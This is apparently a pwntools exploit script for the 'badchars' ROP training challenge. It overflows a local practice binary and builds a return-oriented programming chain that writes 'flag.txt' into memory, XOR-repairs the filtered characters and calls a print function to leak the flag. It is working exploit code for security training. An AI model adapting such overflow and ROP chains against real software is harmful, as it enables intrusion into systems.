#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template badchars
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('badchars')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

#Bad characters: x, g, a, .

io = start()


junk = b'A'*40
junk2 = p64(0x0)
r12r13PopGadget = p64(0x40069b) # pop rbp, 12, 13, 14, 15; ret.
                                #   Needs some extra trash for rbp, r14, and r15
writeGadget = p64(0x400634)     # mov qword ptr [r13], r12; ret
                                #   Write to .data section
r14r15PopGadget = p64(0x4006a0) # pop r14; pop r15; ret;
                                #   prep prams for xor
r15r14XorGadget = p64(0x400628) # xor byte ptr [r15], r14b; reti
                                # MOAR XOR
popRdiGadget = p64(0x4006a3)    # Pop .data address into rdi
dataAddress = p64(0x601029)     # .data address
functionAddress = p64(0x400620) # print function address
string = b"flag.txt"            # flag string


payload = junk + r12r13PopGadget + junk2 + string + dataAddress + junk2 + junk2 + writeGadget + r14r15PopGadget + p64(0x8a) + p64(0x601029 + 2) + r15r14XorGadget + r14r15PopGadget + p64(0x8c) + p64(0x601029 + 3) +r15r14XorGadget + r14r15PopGadget + p64(0xc5) + p64(0x601029 + 4) + r15r14XorGadget + r14r15PopGadget + p64(0x93) + p64(0x601029 + 6) + r15r14XorGadget + popRdiGadget + dataAddress + functionAddress


log.info(io.clean())
io.sendline(payload)
log.info(io.clean())





io.interactive()

